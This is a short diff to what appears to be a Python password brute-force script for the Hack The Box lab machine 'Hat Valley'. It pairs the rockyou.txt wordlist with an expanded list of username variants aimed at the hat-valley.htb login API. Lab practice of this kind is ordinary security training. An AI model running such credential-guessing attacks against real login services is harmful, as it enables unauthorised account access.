@@ -2,7 +2,7 @@ from requests import post
 import time
 
 wordlist = "/usr/share/wordlists/rockyou.txt"
-usrn = ["bean.hill", "christine.wool", "christopher.jones", "jackson.lightheart"]
+usrn = ["bean.hill", "christine.wool", "christopher.jones", "jackson.lightheart","bean", "christine", "christopher", "jackson", "hill", "wool", "jones", "lightheart"]
 
 def ayy(username, password):
         endpoint = "http://hat-valley.htb/api/login"
